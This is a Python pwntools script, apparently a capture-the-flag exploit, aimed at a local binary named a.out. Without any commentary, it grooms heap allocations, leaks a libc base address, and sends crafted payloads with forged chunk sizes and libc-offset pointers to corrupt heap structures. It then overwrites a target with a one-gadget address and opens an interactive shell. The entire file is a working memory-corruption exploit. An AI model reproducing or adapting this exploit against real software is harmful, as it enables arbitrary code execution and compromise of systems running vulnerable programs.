from pwn import *

r = process(["./a.out"])

r.recvline()

for i in range(10):
	if i==0:
		r.sendline(str(0x1e0))
		r.sendline("a"*0x1df)
	else:
		r.sendline(str(0x78))
		r.sendline("a"*0x77)
	r.recvuntil("done")


r.sendline("0")
r.sendline("0")
r.recvuntil("e")
r.recvline()
libc = u64(r.recvn(12).replace("1","").ljust(8,'\x00'))-0x3c4ce8-0x70
print hex(libc)
r.sendline("10")
r.sendline("10")
r.recvuntil("done")

r.sendline(str(0x120))
r.sendline("a"*0x77)
r.recvuntil("done")

for i in range(6):
	r.sendline(str(0x10))
	r.sendline("a"*0x6)
	r.recvuntil("done")

for i in range(10):
	if i==0:
		r.sendline(str(0x170))
		r.sendline("a"*0x16f)
	elif i==1:
		r.sendline(str(0x70))
		r.sendline("aabb"*15+"aa"+"\xf0"*41)
	elif i==2:
		r.sendline(str(0x78))
		r.sendline("a"*0x18+p64(0xf0)*5+p64(0xe0)*5)
	else:
		r.sendline(str(0x78))
		r.sendline("a"*0x77)
	r.recvuntil("done")


r.sendline(str(0x28))
r.sendline("a"*0x20)
r.sendline(str(0x38))
r.sendline("a")
r.sendline(str(0x30))
r.sendline("a"*10+"bababab"+"aabb"*5+"ba"+"\xf1")


r.sendline(str(0xb8))
#r.sendline("a")
r.sendline("\x00"*0x98+p64(0x71)+p64(libc+0x3c6798))

r.sendline(str(0x68))
r.sendline(p64(0x0)*3+p64(0x31)+p64(libc+0x3c4b78)+p64(libc+0x3c678b))

r.sendline(str(0x28))
r.sendline("a")

r.sendline(str(0x68))
r.sendline(p64(libc+0x4526a))

r.sendline("10")
r.sendline("a")

r.sendline("10")
r.sendline("a")

r.sendline(str(0x78))
r.sendline("a"*0x77)
r.recvrepeat(1)
r.interactive()
